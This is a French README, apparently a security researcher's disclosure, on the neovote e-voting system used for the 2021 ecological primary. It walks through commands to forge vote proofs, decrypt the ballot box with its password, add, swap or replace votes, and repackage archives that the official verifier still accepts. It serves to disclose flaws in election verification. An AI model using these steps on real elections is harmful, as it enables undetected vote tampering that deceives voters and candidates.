Un peu d'analyse du système [neovote](https://neovote.com) utilisé pour la primaire écologique de 2021.

1 - Outils
==========

Générer une fausse preuve de vote:

```shell
$ python generate_invalid_proof.py
5Ehjzb4WmzpEmKhhvXBEcTV3sSAyR_62i5P1wqwCfcLnQKZW62UomrzyVuz5jeBv-oXSDpaW0kz-RjCAzpzV_aEFiLkISVBamu88Ic7KravGCJNI6DHupQgPlmnYNEl2hZab-I2m80oQV_nnUKoY7tlbIKj-fYXDCfgIwyvVfS7UmawjagkSYjO-ypF8Gazfv1RbVod0YxLlelLY0z65W1Fgvgxvgx4oFsHSQJzTPKqCw0fAgXfSRSoCWFwhlV4Qh0BtNRbOIQviDc2nOsRjSTiOoApai6IHupE_VyfGD5UYyMGW0ViZNQhL4NspQzmhXSF7enOyv1A5NR5IdpRVCPJ84sZ6_CsEQIlhRVqmbLImYIi2582Afj4RpdgwkW0N50RVBlwK3652Iom7poqhVpqdjIbx9doPX_X2dczNx_DFhiboNs7ULqXx74p7A_sRWpL3kI_Z6UzWQfgyhf1WNhL6_Gb7QWDS8cDjccXLCdjEcu7OmmPOmXnwmr3KApCHNlS87HlIIcsLHXd9-1QR_w@@
```

Déchiffrer une preuve de vote pour en extraire les hashes:

```shell
$ MY_PROOF=$(python generate_invalid_proof.py)
$ python decrypt_proof.py $MY_PROOF
Your proof contains the following hashes:
EIKBGEq_QpF3nAjHOZJvXdV6KTscq3qjAUDObdvSnm0CEDnNsu8JLHFFWW_1aM8VxEySINTJOzYkUfvN_zFi2A@@
8XqbwjZZwZjK5cOoh0jsGutQgzhZhiDA4Flu4ib6QSyTRAgkClM3wZE2bXwo5rRwJSVuaKBpLC-DRC81Jjb5_g@@
Dq1sNpv8rkqwWDZp7n1CMMtcRdZDpQEfyFxBojHNCIECbckGA5j8YnMWvIgzAe7oMUYOu9hsyInCM7wbA8gLkQ@@
e1aBpILgnEJbMM96G6ZVig87T2nRJ6fwtPPTsUPVt0fcLla9BUHe7IlkUP8cdQcfIZM1FWmR4CFPzsa-Nc2bXw@@
hpPE7r89WZNf9ThdQtHIANB2ywEN8rAWqjarNyb6L5wiLylsgsXR8X8_Hepbw6zKjk3pPu1w95Pt5lxR0V48Pw@@
```

Télécharger les archives de l'urne et les clés de chiffrement:

```shell
curl -X POST https://primaire.neovote.com/65fae701f14479f676bf4d43cbcb2d5f9d98163afa79518b8416b7536e97ba03 --data 'authKey=biè2Rrwû_çb7TWQà' --output BallotBoxExport.zip
curl -X POST https://primaire.neovote.com/474eccbbc08d2d76b8743bcb84ef15490ee1cdee75ff45fe6153a108ec12342e --data 'authKey=biè2Rrwû_çb7TWQà' --output BallotKeysExport.zip
```

Décompresser les archives de l'urne et les clés de chiffrement:

```shell
7z x -obox ./BallotBoxExport.zip -pbiè2Rrwû_çb7TWQà
php -r 'exec("7za x -y -okeys  ../BallotKeysExport.zip -p" . utf8_decode("biè2Rrwû_çb7TWQà"), $rows, $ret);'  # Hold my beer
```

L'utilisation de caractères accentués dans l'achive pose de gros problèmes de portabilité.
En effet le format zip ne spécifie pas l'encodage à utiliser dans les mot de passes, de fait
celui-ci est arbitraire en fonction du logiciel, de sa version, de l'OS ou encore de la façon de l'exécuter...

Une fois décompressée, l'urne à proprement parlé peut être déchiffrée:

```shell
python unpack_ballot_data.py box/1M-9493O-5D-2B-1C-2T-8S/ballot_data.csv --key-file=keys/1M-9493O-5D-2B-1C-2T-8S.pem --output=ballot_data.json
```

À ce moment l'urne peut être altérée:

```shell
python alter_box.py ./ballot_data.json --action=add --output=altered_ballot_data.json
```

Puis reconstruite en son format chiffré:

```shell
cp -R box altered_box
python repack_ballot_data.py ./altered_ballot_data.json --key-file=keys/1M-9493O-5D-2B-1C-2T-8S.pem --output=altered_box/1M-9493O-5D-2B-1C-2T-8S/ballot_data.csv
```

Enfin l'archive d'urne peut être reconstruite (le mot de passe doit faire obligatoirement
16 caractères pour être accepté par le script de [www.verifier-mon-vote.fr](https://www.verifier-mon-vote.fr/)).

```shell
cd alter_box && 7za a ./BallotBoxExport.zip -pAAAAAAAAAAAAAAAA
# Vu que je n'ai pas réussi à réutiliser le mdp d'origine, l'archive de clé doit aussi être reconstruite...
cd keys && 7za a ./BallotKeysExport.zip -pAAAAAAAAAAAAAAAA
```

2 - Archives modifiées
======================

Le répertoire `altered` contient des archives ayant été altérées :

- `swap`: l'archive a été modifiée pour inverser l'identifiant des candidats
- `add`: l'urne a été bourrée avec des votes additionels (toutes les preuves de votes sont toujours valides, par contre le nombre de votant ne correspond plus à la liste d'émargement)
- `replace`: certains votes on été modifiés (toutes les preuves de votes sont toujours valides ET le nombre de votes correspond à la liste d'émargement !)

Dans les trois cas (swap, add et replace), la vérification de l'urne indique une victoired du mauvais candidat au second tour, cf. copies d'écrans:

- [swap](altered/swap/result.png)
- [add](altered/add/result.png)
- [replace](altered/replace/result.png)
- [original (archive non modifiée)](altered/original/result.png)

Ces archives peuvent être testées depuis le site officiel de vérification [www.verifier-mon-vote.fr](https://www.verifier-mon-vote.fr/):

| type                            | Adresse du serveur de vote                 | Mot de passe       |
|---------------------------------|--------------------------------------------|--------------------|
| swap                            | primaire-altered-by-swap.touilleman.xyz    | `altered_by_swap_` |
| add                             | primaire-altered-by-add.touilleman.xyz     | `_altered_by_add_` |
| replace                         | primaire-altered-by-replace.touilleman.xyz | `alteredBYreplace` |
| original (archive non modifiée) | primaire.neovote.com                       | `biè2Rrwû_çb7TWQà` |

Utilisez votre propre preuve de vote, où à défault celle-là:

```raw
v46Vy31AZeeR6jIvGrqV240VTNr7fYdedwW-QmBKk2dWX6PM-pyDmJdulynelEEzwVj7s0ydMEB5OJQJAd9XkG30xDiDkFb9r33sMZ6SxeP7QzZTF0268xfuhMgt761DzBZTXc4PxtuezxO0W4SRuHsEmdUuwQ-2kCTqU-6tyx0T8r8HcfiN9Tz84hbJ-mf9m_sXhNTqEbxnUD_kt9_NMpJA2UY88Pj4GRkbiW1xdudGRy9kr8ln7nh1er1cSyusP50BHqGivSKZCFR7GJWgmSsJgG6n-WwChJjl5dZzhzAw4yVYVvIS6Y9rH2ME_evgbNGoTTsV7PtMiV12F_syMKQxFbTxe1MGX14FrdSRBDW7mTLQTXR7u0ViGtrR9ZmSfcfZ3Be7UKHMHifY5MYEMZSmu3OQWVowJNu2goNtsXWmdwIhqDz-UzyEyBU9UczLKjeK2CdB8RCUB5R8NZwSakRR1E9OQtoCQhXsHcQBPptQbvEe6HSNNtuTGxZlj8YQozKz0liZdaL-sflCD7LUUg@@
```

Cette preuve du 2nd tour contient les hashes de trois votes ayant été remplacé (dans l'attaque "replace") et deux autres
votes ayant été pris aléatoirement dans l'urne. Malgrés le remplacement, le site de vérification considère la preuve
toujours valide ;-)

Les hashes sont:
```raw
2VfUCQIXiLn12GqUSlzrx7YvF2gFVpighvhFD2By5x-i1VxtuCNkJU56aRY3sYGuwEgdBePBtqgC5wsuI1Nc-g@@
xZmJ4iIfuvVCIv4kYO2st2uKRK_XqVdIqctBkxAzyynhmW1toxv7t7YLEJ4Klx6wcivauh4DNIFk8dhkTbr4MA@@
MOHztrni9eD3ppKTsluKe__IrHA2rQAfv7M9Tze338qmKr0QvSfOyIpciLBuql7uWZXHN9CPhoYMvUZe0uHObA@@
2j9rw1IiGklTBnVrcUOkBqSLO7_WMZuD39_jAoGHtZ5p0k-3cVOedI8F00H0QTd1aefyRcn35HiCKe7GxzNK-w@@
xtPtV2ZcsQuZ45zk4IanzB0uSFLdRy4DJW5gHRb3-ZsTcSSH8MRa9X5JvwgIr55SrAgh1T-GaswzSCZcAUXpEA@@
```

Le site de vérification a tendance à crasher à cause de la charge de travail nécessaire à la vérification (la 100aine
de milliers de RSA dans l'urne à déchiffrer n'aide pas...).

De fait le site met beaucoup de temps à répondre et peut finir en indiquant qu'une erreur à eu lieu, dans ce cas il
faut redémarrer l'opération (le site garde un cache interne du travail déjà réalisé donc l'opération finie par aboutir)
